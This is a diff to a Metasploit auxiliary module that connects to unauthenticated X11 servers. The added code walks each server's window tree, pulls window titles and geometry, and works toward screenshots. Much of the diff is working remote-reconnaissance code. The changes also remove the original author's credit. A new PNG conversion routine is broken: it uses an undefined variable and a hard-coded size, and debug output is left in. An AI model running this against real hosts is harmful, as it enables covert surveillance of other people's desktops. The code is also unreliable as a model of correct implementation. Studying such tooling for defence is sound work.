@@ -18,8 +18,7 @@ class MetasploitModule < Msf::Auxiliary
         a screenshot as well.
       },
       'Author'	=> [
-        'tebo <tebodell[at]gmail.com>', # original module
-        'h00die' # X11 library, screenshot updates
+        'h00die'
       ],
       'References' => [
         ['OSVDB', '309'],
@@ -57,6 +56,35 @@ class MetasploitModule < Msf::Auxiliary
     extension_response
   end
 
+  def convert_zpixmap_to_png(_zpixmap)
+    # Assume zpixmap_data is your array representing ZPixmap data
+    # You need to know the width, height, and color depth of the image
+    width = 100
+    height = 100
+    color_depth = 8 # 8-bit color depth for example
+
+    # Open a file for writing in binary mode
+    File.open('output.png', 'wb') do |file|
+      # PNG signature
+      file.write("\x89PNG\r\n\x1A\n".force_encoding('ASCII-8BIT'))
+
+      # IHDR chunk - Image Header
+      ihdr_data = [width, height, color_depth, 2, 0, 0, 0].pack('NNCCCCC')
+      file.write([ihdr_data.length, 'IHDR', ihdr_data, Zlib.crc32('IHDR' + ihdr_data)].pack('NA4A*N'))
+
+      # IDAT chunk - Image Data
+      idat_data = zpixmap_data.pack('C*')
+      file.write([idat_data.length, 'IDAT', idat_data, Zlib.crc32('IDAT' + idat_data)].pack('NA4A*N'))
+
+      # IEND chunk - End of Image
+      file.write([0, 'IEND', '', Zlib.crc32('IEND')].pack('NA4A*N'))
+    end
+  end
+
+  def has_children?(event_mask)
+    event_mask == 0 || event_mask == 256 || event_mask == 65536
+  end
+
   def take_screenshot(connection)
     query_extension_calls = 0
 
@@ -92,9 +120,18 @@ class MetasploitModule < Msf::Auxiliary
 
     # InternAtom wait
     vprint_status('(7/9) Setting wait on itern atom')
-    sock.put(X11INTERNATOMREQUEST.new(name_value: 'Wait').to_binary_s)
+    sock.put(X11INTERNATOMREQUEST.new(name: 'Wait').to_binary_s)
     sock.get_once(-1, 1)
 
+    vprint_status('(7.5/9) Getting window title atoms')
+    sock.put(X11INTERNATOMREQUEST.new(name: '_NET_WM_NAME').to_binary_s +
+            X11INTERNATOMREQUEST.new(name: "UTF8_STRING\x00").to_binary_s)
+    atom_reply = sock.get_once(-1, 1)
+    @window_name_atom = X11INTERNATOMRESPONSE.read(atom_reply[0..atom_reply.length/2])
+    @window_name_atom = @window_name_atom.atom 
+    @window_string_atom = X11INTERNATOMRESPONSE.read(atom_reply[atom_reply.length/2..-1])
+    @window_string_atom = @window_string_atom.atom 
+    vprint_good("  Using UTF8 windows names via atoms [#{@window_name_atom},#{@window_string_atom}]")
     # xkeyboard-bell
     vprint_status('(8/9) Setting xkeyboard bell')
     sock.put(BELLREQUEST.new(xkeyboard_id: xkeyboard_plugin.major_opcode).to_binary_s)
@@ -108,12 +145,11 @@ class MetasploitModule < Msf::Auxiliary
                             opcode: 3, # GetWindowAttributes
                             unused: query_extension_calls).to_binary_s +
             GETREQUEST.new(
-              window: 1320,
+              window: connection.screen_root,
               opcode: 14, # GetGeometry
               unused: query_extension_calls + 1
             ).to_binary_s) # not sure why we do this
     sock.get_once(-1, 1)
-    query_extension_calls += 2
 
     # translatecoordinates
     vprint_status('(10/9) Getting coordinates translation')
@@ -127,7 +163,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # InternAtom server_overlay_visuals
     vprint_status('(12/9) Setting Server Overlay Visuals on Itern Atom')
-    sock.put(X11INTERNATOMREQUEST.new(name_value: "SERVER_OVERLAY_VISUALS\x00\x00",
+    sock.put(X11INTERNATOMREQUEST.new(name: "SERVER_OVERLAY_VISUALS\x00\x00",
                                       only_if_exists: 1).to_binary_s)
     sock.get_once(-1, 1)
 
@@ -138,34 +174,89 @@ class MetasploitModule < Msf::Auxiliary
                             unused: 3).to_binary_s +
               GETREQUEST.new(opcode: 14,
                              window: connection.screen_root).to_binary_s)
+    sock.get_once(-1, 1)
 
     # querytree
     vprint_status('(14/9) Getting Tree')
-    sock.put(QUERYTREEREQUEST.new(drawable: connection.screen_root).to_binary_s)
-    # XXX typically in 2 packets
-    data = sock.get_once(-1, 1)
-    begin
-      data << sock.get_once(-1, 1)
-    rescue StandardError => e
-      puts e.inspect
+    tree = get_process_tree(connection.screen_root,'')
+    puts "and now were done, heres the final tree"
+    puts tree
+  end
+
+  def get_process_tree(window, spaces)
+    vprint_status("#{spaces}  Getting children for window #{window}")
+    tree = {}
+    sock.put(QUERYTREEREQUEST.new(drawable: window).to_binary_s)
+
+    response = sock.get_once(-1, 1)
+    attempts_to_read_data = 0
+    trees = nil
+    while attempts_to_read_data < 3 && trees.nil?
+      begin
+        trees = QUERYTREERESPONSE.read(response)
+      rescue StandardError => e
+        vprint_bad("Failed to parse data, attempt #{attempts_to_read_data}/3 to get more")
+      end
+      tmp_data  = sock.get_once(-1, 1)
+      response << tmp_data unless tmp_data.nil?
+      attempts_to_read_data +=1
     end
-    trees = QUERYTREERESPONSE.read(data)
-    vprint_status("  Found #{trees.tree.length} trees")
+    vprint_status("  #{spaces}Found #{trees.children.length} child windows")
 
     # getwindowattributes+getgeometry
-    vprint_status('(15/9) Getting window attributes and geometry for each tree')
-    puts trees.inspect
-    trees.tree.each do |t|
-      # XXX this loop is failing hard.
-      next if t == 0
-
+    # vprint_status('(15/9) Getting window attributes and geometry for each tree')
+    #puts trees.inspect
+    trees.children.each_with_index do |child_window, i|
+      #next if t == connection.screen_root # no need to hit the root
+      next if child_window < 5_000 # arbitrary value i'm seeing, most invalid windows are like 0-1500, however valid ones are in the millions
+      #puts "Attemping to get data for child_window: #{child_window}"
       # getwindowattributes+getgeometry
-      sock.put(GETREQUEST.new(window: t,
+      sock.put(GETREQUEST.new(window: child_window,
                               opcode: 3,
                               unused: 3).to_binary_s +
-              GETREQUEST.new(opcode: 14, window: t).to_binary_s)
-      sock.get_once(-1, 1) # this has both responses in it, so we need to split it to process it correctly
+              GETREQUEST.new(window: child_window,
+                opcode: 14).to_binary_s +
+              X11GETPROPERTYREQUEST.new(window: child_window,
+                property: @window_name_atom,
+                get_property_type: @window_string_atom).to_binary_s)
+
+      response = sock.get_once(-1, 1)
+      attempts_to_read_data = 0
+      window_attributes = nil
+      window_geometry = nil
+      window_name = nil
+      while attempts_to_read_data < 3 && (window_attributes.nil? || window_geometry.nil? || window_name.nil?)
+        begin
+          window_attributes = GETWINDOWRESPONSE.read(response[0..44])
+          window_geometry = WINDOWATTRIBUTESGETGEOMETRYRESPONSE.read(response[44..76])
+          window_name = X11GETPROPERTYRESPONSE.read(response[76..-1])
+        rescue StandardError
+          vprint_bad("Failed to parse data, attempt #{attempts_to_read_data}/3 to get more")
+        end
+        tmp_data  = sock.get_once(-1, 1)
+        response << tmp_data unless tmp_data.nil?
+        attempts_to_read_data +=1
+      end
+
+      if window_attributes.nil? || window_geometry.nil? || window_name.nil?
+        print_bad("Error reading data")
+      end
+    
+
+      # if window_geometry.width == connection.screen_width_in_pixels && window_geometry.height == connection.screen_height_in_pixels
+      # if t.to_i.to_s(16) == '2800003' || t.to_i.to_s(16) == '260000a' || t.to_i.to_s(16) == '406913' || t.to_i.to_s(16) == '407896'
+      if window_attributes.your_event_mask == 0 || window_attributes.your_event_mask == 256 || window_attributes.your_event_mask == 65536
+        vprint_status("#{spaces}#{i}/#{trees.children_len} Window: 0x#{child_window.to_i.to_s(16)} (#{window_name.value_data}) #{window_geometry.width}x#{window_geometry.height}+#{window_geometry.x}+#{window_geometry.y}")
+      else
+        print_good("#{spaces}#{i}/#{trees.children_len} Window: 0x#{child_window.to_i.to_s(16)} (#{window_name.value_data}) #{window_geometry.width}x#{window_geometry.height}+#{window_geometry.x}+#{window_geometry.y}")
+        #puts "  #{spaces}#{window_attributes.inspect}"
+        #puts "  #{spaces}#{window_geometry.inspect}"
+        next if child_window == window # dont recurse yourself
+        tree[child_window.to_i] = get_process_tree(child_window, "  #{spaces}")
+        #puts tree.inspect
+      end
     end
+    tree
   end
 
   def run_host(ip)
@@ -177,36 +268,38 @@ class MetasploitModule < Msf::Auxiliary
     begin
       connection = X11CONNECTION.read(packet)
     rescue EOFError
-      vprint_bad("Connection packet malfored (size: #{packet.length}), attempting to get read more data")
+      vprint_bad("Connection packet malformed (size: #{packet.length}), attempting to get read more data")
       packet += sock.get_once(-1, 1)
     end
 
     begin
       connection = X11CONNECTION.read(packet)
-      if connection.success == 1
-        print_good("#{ip} - Successly established X11 connection")
-        vprint_status("  Vendor: #{connection.vendor}")
-        vprint_status("  Version: #{connection.protocol_version_major}.#{connection.protocol_version_minor}")
-        vprint_status("  Screen Resolution: #{connection.screen_width_in_pixels}x#{connection.screen_height_in_pixels}")
-        vprint_status("  Resource ID: #{connection.resource_id_base.inspect}")
-        vprint_status("  Screen root: #{connection.screen_root.inspect}")
-        report_note(
-          host: ip,
-          proto: 'tcp',
-          sname: 'x11',
-          port: rport,
-          type: 'x11.server_vendor',
-          data: "Open X Server (#{connection.vendor})"
-        )
-
-        take_screenshot(connection)
-      else
-        vprint_error("#{ip} Access Denied")
-      end
     rescue StandardError
       vprint_bad('Failed to parse X11 connection initialization response packet')
+      return
     end
 
+    if connection.success == 1
+      print_good("#{ip} - Successly established X11 connection")
+      #puts connection.inspect
+      vprint_status("  Vendor: #{connection.vendor}")
+      vprint_status("  Version: #{connection.protocol_version_major}.#{connection.protocol_version_minor}")
+      vprint_status("  Screen Resolution: #{connection.screen_width_in_pixels}x#{connection.screen_height_in_pixels}")
+      vprint_status("  Resource ID: #{connection.resource_id_base.inspect}")
+      vprint_status("  Screen root: #{connection.screen_root.inspect}")
+      report_note(
+        host: ip,
+        proto: 'tcp',
+        sname: 'x11',
+        port: rport,
+        type: 'x11.server_vendor',
+        data: "Open X Server (#{connection.vendor})"
+      )
+
+      take_screenshot(connection)
+    else
+      vprint_error("#{ip} Access Denied")
+    end
     disconnect
   end
 end
